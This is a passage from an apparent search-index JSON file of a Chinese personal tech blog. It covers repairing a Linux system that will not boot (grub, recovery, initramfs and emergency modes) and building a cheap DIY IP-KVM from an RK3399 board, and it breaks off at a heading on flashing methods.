</li> </ul> <p>BIOS</p> <ul> <li>BIOS\uff0c\u4f4d\u4e8e\u4e3b\u677f flash</li> <li>\u4e00\u7ea7\u5f15\u5bfc\u7a0b\u5e8f\uff0c\u4f4d\u4e8e MBR\uff0c\u51e0\u767e\u5b57\u8282\uff0c\u975e\u5e38\u5c0f\uff0c\u7528\u4e8e\u52a0\u8f7d\u4e8c\u7ea7\u5f15\u5bfc\u7a0b\u5e8f</li> <li>\u4e8c\u7ea7\u5f15\u5bfc\u7a0b\u5e8f\uff08grub\uff09\uff0c\u4f4d\u4e8e</li> <li>\u5185\u6838\uff0clinux \u5185\u6838 (vmlinuz) \u4f4d\u4e8e\u7cfb\u7edf\u76d8/boot \u8def\u5f84\u4e0b\uff0c\u6709\u4e0d\u540c\u7248\u672c\u3002\u8be5\u8def\u5f84\u540c\u65f6\u8fd8\u6709\u521d\u59cb\u6587\u4ef6\u7cfb\u7edf (initrd.img)</li> </ul> <p>UEFI</p> <ul> <li>UEFI\uff0c\u4f4d\u4e8e\u4e3b\u677f flash</li> <li> <p>EFI \u5e94\u7528\uff08grub\uff09\uff0c\u4f4d\u4e8e ESP \u5206\u533a\uff08\u901a\u5e38\u4e3a FAT32 \u6587\u4ef6\u7cfb\u7edf\uff09\u3002grub image \u5728/boot/grub</p> <pre><code>root@Ryzen-Ubuntu22 \u279c  yfy ls /boot/efi/EFI/ubuntu\nBOOTX64.CSV  grub.cfg  grubx64.efi  mmx64.efi  shimx64.efi\nroot@Ryzen-Ubuntu22 \u279c  yfy ls /boot/efi/EFI/BOOT\nBOOTX64.EFI  fbx64.efi  mmx64.efi\n</code></pre> </li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5404\u79cd\u6551\u63f4\u6a21\u5f0f","title":"\u5404\u79cd\u6551\u63f4\u6a21\u5f0f","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#grub-rescue","title":"grub rescue","text":"<ul> <li>\u5185\u6838\u8fd8\u6ca1\u52a0\u8f7d\u524d\uff0cgurb \u9519\u8bef\u3002\u5982\u65e0\u6cd5\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\uff0c\u9700\u8981\u624b\u52a8\u6307\u5b9a kernel \u4f4d\u7f6e\uff08\u54ea\u4e2a\u78c1\u76d8\uff0c\u54ea\u4e2a\u5206\u533a\uff09</li> <li>grub \u5176\u5b83\uff1a<ul> <li>\u6309 ESC \u8fdb\u5165\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u8f93\u5165 normal \u91cd\u56de\u83dc\u5355\u754c\u9762\u3002</li> <li>\u83dc\u5355\u754c\u9762\u8f93\u5165 e\uff0c\u53ef\u4ee5\u7f16\u8f91\u542f\u52a8\u9879\u3002</li> <li>\u9009\u62e9 Ubuntu Advance\uff0c\u53ef\u4ee5\u9009\u62e9\u4e0d\u540c kernel \u7248\u672c\uff0c\u6216\u8005\u8fdb\u5165 recovery \u6a21\u5f0f</li> </ul> </li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#recovery-\u6a21\u5f0f","title":"recovery \u6a21\u5f0f","text":"<ul> <li>\u5c06\u4ee5\u5355\u7528\u6237\u6a21\u5f0f (single-user) \u6a21\u5f0f\u542f\u52a8\uff0c\u662f\u6700\u4f4e\u7684 runlevel\u3002</li> <li>\u7528\u9014\uff1a<ul> <li>\u5fd8\u8bb0 root \u5bc6\u7801</li> <li>\u5176\u5b83\u6a21\u5f0f\u53ef\u80fd\u65e0\u6cd5\u8fdb\u5165\u7cfb\u7edf\uff0c\u800c\u53ef\u4ee5\u8fdb\u5165 recovery \u6a21\u5f0f\u8fdb\u884c\u6062\u590d\uff0c\u6216\u8005\u5907\u4efd\u6587\u4ef6\u3002</li> </ul> </li> <li>\u540e\u9762\u8981\u4ecb\u7ecd\u7684\u4e24\u4e2a\u6a21\u5f0f\uff0c\u5219\u662f\u7cfb\u7edf\u65e0\u6cd5\u6302\u8f7d\uff0c\u88ab\u8feb\u8fdb\u5165\u7684\u6a21\u5f0f\u3002</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#busybox-initramfs","title":"Busybox Initramfs","text":"<ul> <li>\u5185\u6838\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\uff0c\u68c0\u6d4b\u5230\u6839\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u3002\uff08initramfs \u5728\u5185\u6838\u521d\u59cb\u5316\u5230\u80fd\u591f\u6302\u8f7d\u6839\u6587\u4ef6\u7cfb\u7edf\u524d\u4f7f\u7528\uff0cbusybox \u5305\u542b\u5e38\u7528\u7684\u547d\u4ee4\uff09</li> <li>\u901a\u5e38 fsck \u6587\u4ef6\u7cfb\u7edf\u5373\u53ef</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#emergency-\u6a21\u5f0f","title":"emergency \u6a21\u5f0f","text":"<ul> <li>\u5185\u6838\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\u56e0\u4e3a\u4e00\u4e9b\u539f\u56e0\u5d29\u6e83</li> <li>\u4ee5\u53ea\u8bfb\u6a21\u5f0f\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5fc3\u5f97","title":"\u5fc3\u5f97","text":"<ul> <li>\u6298\u817e\u4e4b\u524d\u505a\u597d\u6700\u574f\u7684\u6253\u7b97\u3002\u6bd4\u5982\u8fd9\u6b21\u5728\u6211\u8fdb\u5165\u4e0d\u4e86\u7cfb\u7edf\u540e\uff0c\u6211\u6700\u574f\u7684\u60c5\u51b5\u662f\u5c06\u91cd\u8981\u6587\u4ef6\u3001\u914d\u7f6e\u62f7\u8d1d\u51fa\u6765\uff0c\u7136\u540e\u91cd\u65b0\u5b89\u88c5\u7cfb\u7edf\u3002\u671f\u95f4\u6211\u53ef\u4ee5\u4f7f\u7528\u6211\u7684\u7b14\u8bb0\u672c\u5e72\u6d3b\uff08\u56e0\u4e3a\u6211\u7684 workspace \u6587\u4ef6\u5939\u662f\u642d\u5efa\u4e86\u81ea\u52a8\u540c\u6b65\u7684\uff09\u3002\u5982\u679c\u5728\u6211\u7684\u7cfb\u7edf\u5d29\u6389\u671f\u95f4\uff0c\u6211\u5565\u90fd\u5e72\u4e0d\u4e86\uff0c\u90a3\u6211\u7684\u5fc3\u7406\u538b\u529b\u662f\u4f1a\u975e\u5e38\u5927\u7684\u3002</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/","title":"\u6361\u5783\u573e-rk3399 DIY KVM","text":"<p>\u7531\u4e8e\u6211\u7684\u53f0\u5f0f\u673a\u627f\u8f7d\u4e86 NAS\uff0c\u505a\u79cd\uff0cJellyfin\uff0c\u535a\u5ba2\uff0c\u6587\u4ef6\u540c\u6b65\u7b49\u529f\u80fd\uff0c\u5df2\u7136\u6210\u4e3a\u4e00\u53f0\u670d\u52a1\u5668\uff0c\u56e0\u6b64\u5176\u53ef\u9760\u6027\u975e\u5e38\u91cd\u8981\u3002\u4f46\u662f\u6211\u8fd8\u662f\u7ecf\u5386\u8fc7\u51e0\u6b21\u7531\u4e8e\u7f51\u7edc\u6545\u969c\u5bfc\u81f4\u5176\u65e0\u6cd5\u8bbf\u95ee\u7684\u60c5\u5f62\uff0c\u6b64\u65f6\u5219\u53ea\u80fd\u53bb\u5b9e\u9a8c\u5ba4\u7ef4\u62a4\u6bd4\u8f83\u9ebb\u70e6\uff0c\u56e0\u6b64\u9700\u8981\u4e00\u4e2a IPMI \u7684\u7ba1\u7406\u529f\u80fd\uff0c\u4f7f\u5f97\u7f51\u7edc\u51fa\u6545\u969c\u60c5\u51b5\u4e0b\u4e5f\u80fd\u8fdc\u7a0b\u8bbf\u95ee\u3002</p> <p>\u800c\u5bb6\u7528 PC \u4e3b\u677f\u5f88\u5c11\u6709\u652f\u6301 IPMI \u529f\u80fd\u7684\uff0c\u652f\u6301\u7684\u677f\u5b50\u4e00\u822c\u90fd\u8981 2000 \u5143\u4ee5\u4e0a\u3002\u56e0\u6b64\u9700\u8981\u4e00\u4e2a\u6210\u672c\u4f4e\u5ec9\u7684\u65b9\u6848\uff0c\u5728\u7f51\u4e0a\u641c\u7d22\u4e00\u9635\u540e\u53d1\u73b0\u786e\u5b9e\u6709\u57fa\u4e8e\u6811\u8393\u6d3e DIY \u7684\u65b9\u6848\uff0c\u5e76\u4e14\u6709\u4e00\u4e2a\u6bd4\u8f83\u5927\u7684\u5f00\u6e90\u9879\u76ee PI-KVM\u3002</p> <p>\u7136\u800c\u7531\u4e8e\u6811\u8393\u6d3e 400-500 \u6602\u8d35\u7684\u4ef7\u683c\uff0c\u4f7f\u5f97 DIY \u7684\u6210\u672c\u4ecd\u7136\u5f88\u9ad8\u3002\u76f4\u5230\u6211\u770b\u5230\u4f7f\u7528\u666e\u901a arm \u677f\u5b50\u7684\u65b9\u6848\u3002\u751a\u81f3\u53ef\u4ee5\u4f7f\u7528 40 \u5143\u7684\u7535\u89c6\u76d2\u5b50\u3002\u56e0\u6b64\u4ef7\u683c\u5b8c\u5168\u53ef\u4ee5\u4fdd\u8bc1\u5728 200 \u5143\u4ee5\u5185\uff0c\u6211\u89c9\u7684\u662f\u4e00\u4e2a\u53ef\u4ee5\u63a5\u53d7\u7684\u65b9\u6848\u3002</p> <p>\u6700\u540e\u6210\u672c</p> <ul> <li>king3399 \u5f00\u53d1\u677f\uff1a\u54b8\u9c7c 120</li> <li>ms2130 USB \u91c7\u96c6\u5361\uff0c\u652f\u6301 1080p 60 \u5e27\uff1a\u6dd8\u5b9d 60</li> </ul> <p></p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5f00\u53d1\u677f","title":"\u5f00\u53d1\u677f","text":"<p>RK3399 \u662f Rockchip\uff08\u745e\u82af\u5fae\uff09\u51fa\u7684\u4e00\u6b3e SoC\uff0c\u5728\u6b64\u57fa\u7840\u4e0a\uff0c\u8bb8\u591a\u5f00\u53d1\u677f\u5382\u5546\u8bbe\u8ba1\u4e86\u81ea\u5df1\u7684\u5f00\u53d1\u677f\u3002</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#rk3399-\u786c\u4ef6\u8d44\u6e90","title":"rk3399 \u786c\u4ef6\u8d44\u6e90","text":"<p>\u4e3b\u8981\u7279\u70b9</p> <ul> <li>\u7f51\u7edc\uff1a<ul> <li>\u5343\u5146\u4ee5\u592a\u7f51</li> <li>\u652f\u6301 wifi+ \u84dd\u7259</li> </ul> </li> <li>\u5185\u90e8\u5b58\u50a8<ul> <li>BootROM(32KB)\uff1a\u652f\u6301\u4ece SPI\u3001eMMC\u3001SD/MMC \u63a5\u53e3\u542f\u52a8</li> <li>Internal SRAM(200KB)\uff1aSupport security and non-security access</li> </ul> </li> <li>\u7247\u5916\u5b58\u50a8<ul> <li>\u677f\u8f7d eMMC(16G)</li> <li>\u652f\u6301 SD/MMC</li> </ul> </li> <li>\u4e24\u4e2a OTG usb \u63a5\u53e3</li> <li>PCIe1.0 M.2 (Bkey)<ul> <li>Mini PCIe \u4e3a LTE \u6a21\u5757\u4e13\u7528\u63a5\u53e3\uff0c\u677f\u8f7d SIM \u5361\u5ea7\uff0c\u5b9e\u73b0 IOT \u5e94\u7528</li> </ul> </li> </ul> <p></p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5df2\u77e5\u7684\u5f00\u53d1\u677f\u53ca\u8d44\u6599","title":"\u5df2\u77e5\u7684\u5f00\u53d1\u677f\u53ca\u8d44\u6599","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#firefly","title":"Firefly","text":"<p>Firefly\uff1a\u4e2d\u5c71\u5e02\u5929\u542f\u667a\u80fd\u79d1\u6280\u6709\u9650\u516c\u53f8\u4e8e 2014 \u5e74\u521b\u7acb\u7684\u5f00\u6e90\u56e2\u961f\uff0c\u81f4\u529b\u4e8e\u4eba\u5de5\u667a\u80fd\u3001\u667a\u80fd\u786c\u4ef6\u3001\u5d4c\u5165\u5f0f\u5f00\u53d1\u3001\u7cfb\u7edf\u5f00\u53d1\u3001\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u7b49\u7814\u53d1\uff0c\u62e5\u6709\u5f00\u6e90\u7cfb\u5217\u4ea7\u54c1\u3001\u5f00\u6e90\u793e\u533a\u4e0e\u7f51\u4e0a\u5546\u57ce\u3002Firefly \u5f00\u6e90\u4ea7\u54c1\u5305\u62ec\u6838\u5fc3\u677f\u3001\u884c\u4e1a\u4e3b\u677f\u3001\u884c\u4e1a\u6574\u673a\u3001\u96c6\u7fa4\u670d\u52a1\u5668\u3001\u5f00\u53d1\u5957\u4ef6\u3001Station \u7b49\u4ea7\u54c1\u3002</p> <p>\u8d44\u6599\u6700\u5168\u7684\u5f00\u53d1\u677f\uff0c\u5382\u5bb6\u6709\u81ea\u5df1\u7684\u7f51\u7ad9\uff0c\u63d0\u4f9b\u8be6\u7ec6\u6559\u7a0b\u3002 1. \u4ecb\u7ecd \u2014 Firefly Wiki (t-firefly.com)</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#king3399","title":"king3399","text":"<p>\u5bb9\u54c1\u6df1\u5733\u7535\u5b50\u79d1\u6280 \u4ece\u54b8\u9c7c\u8d2d\u4e70\uff0c\u5356\u5bb6\u63d0\u4f9b\u4e86\u539f\u5382\u7684\u8be6\u7ec6\u6587\u6863\uff0c\u5305\u542b\uff1aSDK\uff08\u9002\u914d\u7684 buildroot, ubuntu, debian, Android \u6e90\u7801\uff0c\u4ee5\u53ca\u7f16\u8bd1\u65b9\u6cd5\uff09\uff0c\u7f16\u8bd1\u597d\u7684\u955c\u50cf\uff0c\u786c\u4ef6 datasheet \u7b49</p> <p>\u745e\u82af\u5fae King3399 \u6269\u5c55\u677f - \u6df1\u5733\u8363\u54c1\u7535\u5b50\u79d1\u6280\u6709\u9650\u516c\u53f8 (rpdzkj.com) </p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#tn3399_v3","title":"tn3399_v3","text":"<p>\u6df1\u5733\u5e02\u5929\u8bfa</p> <p>github \u4e0a\u6709\u4eba\u6298\u817e\u51fa\u7684\u8d44\u6599\uff0c\u4e5f\u652f\u6301\u5237\u8bb8\u591a\u7cfb\u7edf\u4e86\uff1alanseyujie/tn3399_v3: TN3399_V3 \u5f00\u53d1\u677f\u6298\u817e\u8bb0\u5f55 (github.com)</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5176\u5b83","title":"\u5176\u5b83","text":"<ul> <li>RK \u5e73\u53f0\u8d44\u6599\u6536\u96c6\uff1aXianlee's Log (lightembedded.com)</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u65b9\u6848\u8ba8\u8bba","title":"\u65b9\u6848\u8ba8\u8bba","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u57fa\u672c\u65b9\u6848","title":"\u57fa\u672c\u65b9\u6848","text":"<p>DIY \u4e00\u4e2a\u8fd0\u7ef4\u795e\u5668 Open IP-KVM - \u77e5\u4e4e (zhihu.com) \u8fd9\u79cd\u65b9\u6848\u5982\u4f55\u5462\uff1a 1.\u4f7f\u7528 CH9329+CH340 \u6a21\u62df\u9f20\u6807\u952e\u76d8 2.HDMI-USB \u89c6\u9891\u91c7\u96c6\u5361\u83b7\u53d6\u56fe\u50cf 3.ARM \u5f00\u53d1\u677f\u5b89\u88c5 Linux \u7cfb\u7edf 4.GPIO \u6269\u5c55\u677f\u63a7\u5236\u76ee\u6807\u7535\u8111\u7684\u5f00\u5173\u673a\u5f15\u811a\u5b9e\u73b0\u5f00\u5173\u673a 5.\u91c7\u7528\u8fdc\u7a0b\u5149\u9a71\u955c\u50cf\u5171\u4eab\u6280\u672f\u3002\u5ba2\u6237\u7aef\u9009\u62e9\u5b89\u88c5\u7684\u5149\u76d8\u955c\u50cf\uff0c\u901a\u8fc7 IP-KVM \u7f51\u7edc\u53d1\u9001\u5230\u5f00\u53d1\u677f\u3002\u5f00\u53d1\u677f\u63a5\u6536\u5230\u540e\uff0c\u901a\u8fc7 iSCSI \u7b49\u7f51\u7edc\u534f\u8bae\uff0c\u5c06\u8be5\u5149\u76d8\u955c\u50cf\u6302\u8f7d\u4e3a\u76ee\u6807\u7535\u8111\u7684\u4e00\u5757\u865a\u62df\u5149\u76d8\u3002\u76ee\u6807\u7535\u8111\u53ef\u4ee5\u5bf9\u8be5\u865a\u62df\u5149\u76d8\u8fdb\u884c\u5f15\u5bfc\u548c\u5b89\u88c5\u64cd\u4f5c</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#arm-kvm","title":"ARM-KVM","text":"<p>b \u7ad9\u770b\u5230 IPKVM \u7684\u4e00\u4e2a\u65b9\u6848\uff0c\u8bf7\u6559\u4e0b\u600e\u4e48\u5b9e\u73b0 - V2EX</p> <ul> <li>\u300c\u6559\u7a0b\u300d\u5ec9\u4ef7\u7684\u8fd0\u7ef4\u795e\u5668 ArmKVM \u5b89\u88c5\u4e0e\u4f7f\u7528_\u54d4\u54e9\u54d4\u54e9_bilibili</li> <li>ArmKVM \u5b98\u65b9\u6587\u6863 (moeneko.xyz)</li> <li>B \u7ad9\u4f5c\u8005\u5df2\u7ecf\u628a\u5b83\u5546\u4e1a\u91cf\u4ea7\u4e86\uff0c\u4f46\u662f\u552e\u4ef7 330 \u8d77<ul> <li>CPU \u662f\u5168\u5fd7 H610\uff0c\u611f\u89c9\u4ec0\u4e48\u90fd\u7f29\u6c34\u4e86\uff0c\u9664\u4e86\u677f\u5b50\u662f\u65b0\u7684\u5916\uff0c\u76f8\u6bd4\u4e8e\u81ea\u5df1\u4e70\u4e8c\u624b\u5f00\u53d1\u677f DIY \u6ca1\u6709\u6027\u4ef7\u6bd4\u3002</li> <li>\u800c\u4e14\u7cfb\u7edf\u4e5f\u4e0d\u77e5\u9053\u662f\u4ec0\u4e48\uff0c\u611f\u89c9\u53ef\u73a9\u6027\u6bd4\u8f83\u5dee</li> </ul> </li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u57fa\u4e8e-armbian-\u7684-pi-kvm","title":"\u57fa\u4e8e Armbian \u7684 PI-KVM","text":"<ul> <li>\u5c06 PI-KVM \u79fb\u690d\u5230\u4e86 Armbian \u7cfb\u7edf\u4e0a</li> <li>\u6253\u9020\u666e\u901a PC \u62e5\u6709\u670d\u52a1\u5668 IPMI \u786c\u4ef6\u7ea7\u522b\u7684\u8fdc\u7a0b\u8fd0\u7ef4\u65b9\u6848 PI KVM \u786c\u4ef6\u7ea7\u8fdc\u7a0b\u63a7\u5236_\u54d4\u54e9\u54d4\u54e9_bilibili<ul> <li>\u6559\u7a0b https://github.com/toss-a/pikvm-armbian/blob/master/README-zh-CN.MD</li> </ul> </li> <li>\u4f5c\u8005\u7684\u4ed3\u5e93\uff1asrepac/kvmd-armbian: KVMD For Armbian Install Script (github.com)</li> </ul> <p>\u53ea\u9700\u8981\u5f00\u53d1\u677f\u53ef\u4ee5\u5237 Armbian \u7684\u955c\u50cf\uff0c\u786c\u4ef6\u6709\u652f\u6301 OTG \u7684 USB \u63a5\u53e3\u5373\u53ef\u3002\u975e\u5e38\u9002\u5408\u81ea\u5df1 DIY \u7684\u65b9\u6848</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#pi-kvm-x86","title":"Pi-KVM x86","text":"<p>\u6709\u4e00\u4e9b 40 \u5143\u7684 x86 \u677f\u5b50\u3002\u5982\u679c\u53ef\u4ee5\u6539\u9020\u6210 KVM \u90a3\u4e48\u6027\u4ef7\u6bd4\u4f1a\u5f88\u9ad8\u3002</p> <p>x86 \u677f\u5b50\u7684\u7279\u70b9</p> <ul> <li>\u53ef\u4ee5 pcie \u53d6\u7535</li> <li>\u6ca1\u6709 OTG \u548c GPIO\uff0c\u56e0\u6b64\u9700\u8981\u8fde\u63a5\u989d\u5916\u7684 MCU \u677f\u5b50\u3002\u6bd4\u5982\u540e\u9762\u63d0\u5230\u7684 Arduino Lenard\uff0c\u53ea\u9700\u898126\u5143\u3002<ul> <li>x86 \u53ef\u4ee5\u901a\u8fc7\u4e32\u53e3\u53d1\u9001\u547d\u4ee4\u7ed9 MCU \u677f\u5b50\uff0cMCU \u677f\u5b50\u6267\u884c\u64cd\u4f5c\u3002</li> </ul> </li> </ul> <p>\u53c2\u8003</p> <ul> <li>GitHub - purplepalmdash/pikvmx86: Run Pi-KVM on x86</li> <li>\u57fa\u4e8e PiKVM \u5236\u4f5c M1 Mac Mini KVM \u2013 \u5c5e\u4e8e CYY \u81ea\u5df1\u7684\u4e16\u754c (cyyself.name)</li> </ul> <ul> <li>HDMI-USB Dongle/35 RMB/USD 4.61</li> <li>Arduino Leonard R3/26 RMB/USD 3.74<ul> <li>\u6269\u5c55\u51fa GPIO</li> <li>\u6269\u5c55\u51fa OTG\uff0c\u7528\u4e8e\u6a21\u62df\u952e\u76d8\u9f20\u6807</li> </ul> </li> <li>USB-TTL PL2303/3.1 RMB/USD 0.45<ul> <li>\u7528\u4e8e x86 \u8fde\u63a5 arduino</li> </ul> </li> <li>HDMI Line/7 RMB/USD 1</li> </ul> <p>Leonardo | Arduino Documentation</p> <p>The Arduino Leonardo is a microcontroller board based on the ATmega32u4. It has 20 digital input/output pins (of which 7 can be used as PWM outputs and 12 as analog inputs), a 16 MHz crystal oscillator, a micro USB connection, a power jack, an ICSP header, and a reset button. It contains everything needed to support the microcontroller; simply connect it to a computer with a USB cable or power it with a AC-to-DC adapter or battery to get started.</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#king3399-\u5237\u673a","title":"king3399 \u5237\u673a","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u6559\u7a0b\u94fe\u63a5","title":"\u6559\u7a0b\u94fe\u63a5","text":"<p>2022 \u5e74\u65b0\u9c9c\u77ff\u6e23\uff0c\u8363\u54c1 king3399 Linux \u5237\u673a\u6559\u7a0b\u4e0e\u6027\u80fd\u6d4b\u8bd5 - YouTube King3399/\u8363\u54c13399\u5237\u673a\u6559\u7a0b - \u5fc3\u8bed\u535a\u5ba2 (vpset.com)</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5237\u539f\u5382\u955c\u50cf-vs-\u7b2c\u4e09\u65b9","title":"\u5237\u539f\u5382\u955c\u50cf vs \u7b2c\u4e09\u65b9","text":"<p>\u5f00\u53d1\u677f\u5382\u5bb6\u63d0\u4f9b\u7684 SDK \u5305\u4e2d\u4f1a\u5305\u542b\u539f\u5382\u955c\u50cf\uff0c\u50cf Firefly \u5219\u53ef\u4ee5\u4ece\u5b98\u7f51\u4e0b\u8f7d\u3002 \u5237\u539f\u5382\u955c\u50cf\uff1a</p> <ul> <li>\u4f18\u70b9<ul> <li>\u7ecf\u8fc7\u5382\u5bb6\u6d4b\u8bd5\uff0c\u6bd4\u8f83\u7a33\u5b9a</li> <li>\u5237\u673a\u6bd4\u8f83\u5bb9\u6613</li> </ul> </li> <li>\u7f3a\u70b9<ul> <li>\u53ef\u80fd\u652f\u6301\u7684\u5185\u6838\u7248\u672c\u6bd4\u8f83\u4f4e</li> <li>\u955c\u50cf\u9009\u62e9\u6027\u6bd4\u8f83\u5c11\u3002\u53ef\u80fd\u5382\u5bb6\u53ea\u9002\u914d\u4e86 debian,ubuntu \u955c\u50cf\u3002</li> </ul> </li> </ul> <ul> <li>\u8981\u652f\u6301 Armbian\uff0copenwrt \u7b49\u5176\u5b83\u64cd\u4f5c\u7cfb\u7edf\u9700\u8981\u81ea\u5df1\u79fb\u690d\u7f16\u8bd1\uff0c\u4e00\u822c\u9700\u8981\u677f\u5b50\u7684 dtb\uff0c\u53ef\u4ee5\u4ece\u539f\u5382\u7cfb\u7edf\u4e2d\u63d0\u53d6\u3002\u901a\u5e38\u7f51\u4e0a\u6709\u5927\u4f6c\u79fb\u690d\u8fc7\u4e86</li> <li>king3399 \u5382\u5bb6\u63d0\u4f9b\u4e86\u4ee5\u4e0b\u7cfb\u7edf\u955c\u50cf<ul> <li>linux<ul> <li>ubuntu(18.04)</li> <li>debian(buster 10)</li> </ul> </li> <li>android: 7, 8, 10</li> </ul> </li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5237\u673a\u65b9\u6cd5","title":"\u5237\u673a\u65b9\u6cd5","text":"<p>Rockchip \u5e73\u53f0\u5237\u673a\u65b9\u6cd5\u6c47\u603b\uff1aXianlee's Log 